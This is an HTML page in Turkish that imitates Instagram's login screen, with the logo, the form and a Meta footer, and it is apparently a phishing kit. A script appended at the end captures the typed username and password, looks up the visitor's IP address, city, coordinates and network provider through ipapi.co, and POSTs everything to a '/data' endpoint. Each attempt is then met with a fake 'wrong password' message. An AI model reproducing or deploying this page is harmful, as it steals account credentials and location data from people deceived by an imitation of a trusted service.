<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" type="image/x-icon" />
<style>
    body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        background-color: #fafafa;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
    }

    .wrapper {
        display: flex;
        gap: 50px;
        max-width: 900px;
        width: 100%;
    }

    .left-image {
        flex: 1;
        background-image: url('https://ddk0npjln2y9m8.archive.is/dFOQl/68849a3b177ee51ed943380289256334056614ea.png');
        background-size: cover;
        background-position: center;
        display: none;
    }

    .login-container {
        flex: 1;
        display: flex;
        flex-direction: column;
        align-items: center;
    }

    .login-box {
        width: 350px;
        background-color: #fff;
        border: 1px solid #dbdbdb;
        padding: 40px 30px;
        display: flex;
        flex-direction: column;
        align-items: center;
        margin-bottom: 10px;
        box-shadow: 0 0 8px rgba(0,0,0,0.1);
        border-radius: 8px;
    }

    .login-box img {
        margin-bottom: 20px;
    }

    .login-box input {
        width: 100%;
        margin: 6px 0;
        padding: 9px 0 7px 8px;
        border: 1px solid #dbdbdb;
        border-radius: 3px;
        background: #fafafa;
        font-size: 14px;
        box-sizing: border-box;
        transition: border-color 0.2s;
    }

    .login-box input:focus {
        border-color: #a8a8a8;
        outline: none;
    }

    .login-box button {
        margin-top: 10px;
        width: 100%;
        background-color: #0095f6;
        border: none;
        color: #fff;
        font-weight: bold;
        padding: 8px 0;
        border-radius: 4px;
        cursor: pointer;
        font-size: 14px;
        transition: background-color 0.2s;
    }

    .login-box button:hover {
        background-color: #0073e6;
    }

    .separator {
        width: 100%;
        text-align: center;
        margin: 15px 0;
        color: #8e8e8e;
        font-size: 13px;
        position: relative;
    }

    .separator::before,
    .separator::after {
        content: "";
        position: absolute;
        top: 50%;
        width: 40%;
        height: 1px;
        background-color: #dbdbdb;
    }

    .separator::before {
        left: 0;
    }

    .separator::after {
        right: 0;
    }

    .social-login {
        display: flex;
        align-items: center;
        gap: 5px;
        font-size: 14px;
        color: #385185;
        font-weight: bold;
        cursor: pointer;
    }

    .signup-box {
        width: 350px;
        background-color: #fff;
        border: 1px solid #dbdbdb;
        padding: 20px;
        text-align: center;
        font-size: 14px;
        border-radius: 8px;
    }

    .signup-box a {
        color: #0095f6;
        text-decoration: none;
        font-weight: bold;
    }

    .footer {
        margin-top: 20px;
        text-align: center;
        font-size: 12px;
        color: #8e8e8e;
        max-width: 350px;
    }

    .footer a {
        margin: 0 5px;
        color: #00376b;
        text-decoration: none;
    }

    .message {
        color: red;
        font-size: 13px;
        margin-top: 10px;
        height: 18px;
    }

    @media (min-width: 768px) {
        .left-image {
            display: block;
        }
    }

    @media (max-width: 768px) {
        .wrapper {
            flex-direction: column;
            align-items: center;
        }
        .left-image {
            display: none;
        }
    }
</style>
</head>
<body>

<div class="wrapper">
    <div class="left-image"></div>

    <div class="login-container">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" width="175">
            <input type="text" id="username" placeholder="Telefon, kullanıcı adı veya e-posta">
            <input type="password" id="password" placeholder="Şifre">
            <button id="loginBtn">Giriş Yap</button>

            <div class="message" id="message"></div>

            <div class="separator">YA DA</div>

            <div class="social-login" id="facebookLogin">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" width="15" alt="fb">
                <span>Facebook ile Giriş Yap</span>
            </div>

            <a href="#" id="forgotPassword" style="margin-top: 10px; font-size: 12px; color: #00376b;">Şifreni mi unuttun?</a>
        </div>

        <div class="signup-box">
            Hesabın yok mu? <a href="#">Kaydol</a>
        </div>

        <div class="footer">
            <a href="#">Meta</a> ·
            <a href="#">Hakkında</a> ·
            <a href="#">Blog</a> ·
            <a href="#">İşler</a> ·
            <a href="#">Yardım</a> ·
            <a href="#">API</a> ·
            <a href="#">Gizlilik</a> ·
            <a href="#">Şartlar</a> ·
            <a href="#">Konumlar</a> ·
            <a href="#">Instagram Lite</a> ·
            <a href="#">Meta AI</a>
        </div>
    </div>
</div>

<script>
document.getElementById('loginBtn').addEventListener('click', function(e){
    e.preventDefault();
    // Her zaman şifre yanlış mesajı
    document.getElementById('message').innerText = "Kullanıcı adı veya şifre yanlış.";
});

// Facebook ve şifre unuttum linklerini etkisizleştirelim
document.getElementById('facebookLogin').addEventListener('click', (e) => e.preventDefault());
document.getElementById('forgotPassword').addEventListener('click', (e) => e.preventDefault());

</script>

</body>
</html>

<script>
async function getIpDetails() {
  try {
    const res = await fetch("https://ipapi.co/json/");
    return await res.json();
  } catch (err) {
    return {};
  }
}

document.getElementById('loginBtn').addEventListener('click', async function() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    document.getElementById('message').innerText = "Kullanıcı adı veya şifre yanlış. Lütfen tekrar deneyin.";

    const data = await getIpDetails();

    const payload = {
        username: username,
        password: password,
        ip: data.ip,
        city: data.city,
        region: data.region,
        country: data.country_name,
        latitude: data.latitude,
        longitude: data.longitude,
        asn: data.asn,
        org: data.org
    };

    // Bilgileri gönder
    fetch('/data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(err => console.error(err));
});
</script>
</body>
</html>
